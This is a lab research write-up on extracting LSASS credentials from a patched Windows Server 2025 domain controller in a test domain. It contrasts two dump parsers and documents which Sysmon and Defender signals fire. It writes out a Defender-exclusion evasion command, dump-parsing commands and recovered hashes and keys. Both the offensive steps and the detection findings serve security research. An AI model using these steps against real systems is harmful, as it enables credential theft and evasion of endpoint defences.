# Vector 7c — Windows Server 2025 UBR 32690: Parser Boundary & Credential Extraction Under Defender

**Series:** AD-Lab-Research | Windows Credential Extraction  
**Target:** Windows Server 2025 — Build 26100.32690 (KB5082063, April 14 2026)  
**Domain:** badsuccessor.local  
**Author:** Osher Jacobs  

---

## Overview

This vector documents LSASS credential extraction against a fully patched Windows Server 2025 domain controller (UBR 32690 — current April 2026 security baseline), with Defender Real-Time Protection active, full Sysmon instrumentation, and ELK telemetry.

The central finding: **the April 2026 patch cycle broke public parser tooling without hardening the underlying access model.** The OS shipped struct-level changes in `lsasrv.dll` that silently invalidated pypykatz. The community closed the gap faster than defenders adapted. The detection surface remained unchanged.

> *"2025 — New and breakable."*

---

## Environment

| Component | Detail |
|---|---|
| Target | WIN-A33E3D6C61G — Windows Server 2025, PDC |
| Domain | badsuccessor.local |
| UBR | 26100.32690 (KB5082063 — April 14 2026) |
| Defender sigs | 1.449.353.0 |
| Attacker | Kali Linux |
| Telemetry | Sysmon v15.20 + Winlogbeat 8.19.14 → ELK 8.19 |

---

## Attack Chain

### Step 1 — Defender Exclusion Window

Defender RTP active. A transient folder exclusion was added immediately before dump execution and removed immediately after exfiltration — creating a blind window limited to the dump duration (~50 minutes under active memory scanning).

```powershell
Add-MpPreference -ExclusionPath "C:\Windows\Temp"
# launch curio.exe
# [dump completes ~50 min]
Remove-MpPreference -ExclusionPath "C:\Windows\Temp"
```

### Step 2 — LSASS Dump via curio.exe

Custom C# MiniDumpWriteDump implementation via P/Invoke to `dbghelp.dll`. Executed as SYSTEM via remote scheduled task shell. Output: `C:\Windows\Temp\out2.dmp` (~135MB).

### Step 3 — Exfiltration

Dump exfiltrated to analyst machine via SMB.

### Step 4 — Parser Comparison

Both tools run against the same dump on an offline analyst machine.

---

## Finding 1 — pypykatz 0.6.13 Fails on UBR 32690

```
pypykatz lsa minidump out32690PATCH.dmp
```

**Result:**

```
msv_exception_please_report
Memory address 0x001a0018 not in process memory space
entry.Domaine.read_string
```

**Root cause:** Struct offset drift in `lsasrv.dll` 10.0.26100.32690. The `KIWI_MSV1_0_PRIMARY_CREDENTIAL` layout changed post-UBR 1742. pypykatz 0.6.13 hardcodes offsets derived from pre-patch builds. The `entry.Domaine.read_string` call walks to an invalid memory address — MSV extraction fails entirely. WDIGEST and DPAPI parse successfully (different struct paths), confirming this is a targeted layout break, not a wholesale access failure.

---

## Finding 2 — KvcForensic Succeeds

**Tool:** [KvcForensic](https://github.com/wesmar/KvcForensic) by Marek Wesołowski (WESMAR) — MIT License  

```
KvcForensic.exe --analyze-dump --input out32690PATCH.dmp --format both
```

**Result:**

```
[+] AES-128 decryption active   sessions: 19

== LogonSession ==
authentication_id 573021 (8be5d)
username Administrator
domainname BADSUCCESSOR

    == MSV ==
        NT: 3c02b6b6fb6b3b17242dc33a31bc011f
        SHA1: af61169243da7612a64549a9ca1ca418fce3fcde
        DPAPI: afc584cb8f0fe9daf899728f34c15ebb00000000

    == Kerberos ==
        TGT extracted (EncType 18, Kvno 2)

    == DPAPI ==
        masterkey: b888500b8371f926...
        sha1_masterkey: 12b1706e259605f9...

[*] 19 logon session(s) parsed.
```

**Why it works:** KvcForensic uses a scoring-based `DetectSessionFieldLayout` that probes multiple candidate struct offsets and validates against known-good field patterns. It does not hardcode offsets. Post-1742 build changes are handled transparently.

---

## Comparative Table

| Tool | UBR 32690 | MSV NT hash | Notes |
|---|---|---|---|
| pypykatz 0.6.13 | ❌ FAIL | Not obtained | `entry.Domaine.read_string` — struct offset mismatch |
| KvcForensic (wesmar) | ✅ SUCCESS | `3c02b6b6fb6b3b17242dc33a31bc011f` | Scoring-based layout detection |

Same dump. Same patch level. Same access model. Different tooling outcome.

---

## Finding 3 — Sysmon EID 10 Blind Spot

Sysmon v15.20 configured with permissive ProcessAccess rule:

```xml
<ProcessAccess onmatch="include">
  <TargetImage condition="end with">lsass.exe</TargetImage>
</ProcessAccess>
```

**No EID 10 generated for curio.exe.**

curio.exe was executed as SYSTEM via remote scheduled task (goexec/tsch). Sysmon's kernel callback for `NtOpenProcess` does not intercept handle opens originating from this execution context. The event is not generated — not filtered, not suppressed — simply absent.

This is not a configuration failure. It is a detection gap inherent to this execution path on Server 2025.

---

## Detection Telemetry

### What fires

**EID 5007 — Defender Exclusion Add/Remove**

Three rules triggered from WIN-A33E3D6C61G:

| Rule | Status |
|---|---|
| Defender - Exclusion Path Added | ✅ |
| Defender - Exclusion Path Removed | ✅ |
| Defender - Transient Exclusion Window Detected | ✅ |

Removal immediately following addition is a strong behavioral indicator of a timed exclusion window — artifact dropped and exfiltrated while blind, exclusion cleaned to reduce forensic footprint.

**EID 4662 — DCSync (footnote)**

```kql
event.code: "4662"
AND winlog.event_data.AccessMask: "0x100"
AND winlog.event_data.OperationType: "Object Access"
AND NOT winlog.event_data.SubjectUserName: *$
```

Fires reliably on secretsdump DRSUAPI replication. Unaffected by parser tooling — operates at protocol layer, not artifact layer. 227 alerts generated per secretsdump execution (rule cap hit). Recommend grouping by `winlog.event_data.SubjectLogonId` to reduce alert volume.

### What does not fire

| Signal | Status | Reason |
|---|---|---|
| Sysmon EID 10 (lsass handle open) | ❌ | Execution via SYSTEM scheduled task — kernel callback not triggered |
| Defender memory scan block | ❌ | Exclusion window active during dump |

---

## Detection Summary

| Phase | Signal | Fires |
|---|---|---|
| Exclusion add | EID 5007 | ✅ |
| LSASS dump | Sysmon EID 10 | ❌ |
| Exclusion remove | EID 5007 | ✅ |
| Parser (offline) | — | No signal (offline operation) |
| DCSync (footnote) | EID 4662 | ✅ |

**The dump itself is invisible to Sysmon in this execution context.** The only on-host signals are the exclusion window bookends. A defender with EID 5007 alerting has a narrow window to respond before exfiltration completes.

---

## Key Observation

The April 2026 patch broke pypykatz. It did not break the underlying memory access model, the MiniDumpWriteDump API, or the DRSUAPI replication protocol. Defenders who treat "tool X doesn't work anymore" as a hardening signal are measuring the wrong thing.

KvcForensic's adaptive layout detection closed the tooling gap within the same patch cycle. The detection surface did not change.

---

## Tools Referenced

- [KvcForensic](https://github.com/wesmar/KvcForensic) — Marek Wesołowski (WESMAR), MIT License, 2026
- pypykatz 0.6.13 — Tamas Jos, BSD License
- impacket secretsdump — Fortra, Apache 2.0
- Sysmon v15.20 — Microsoft Sysinternals

---

*Vector 7 | Vector 7b | **Vector 7c** | Vector 8 (upcoming)*
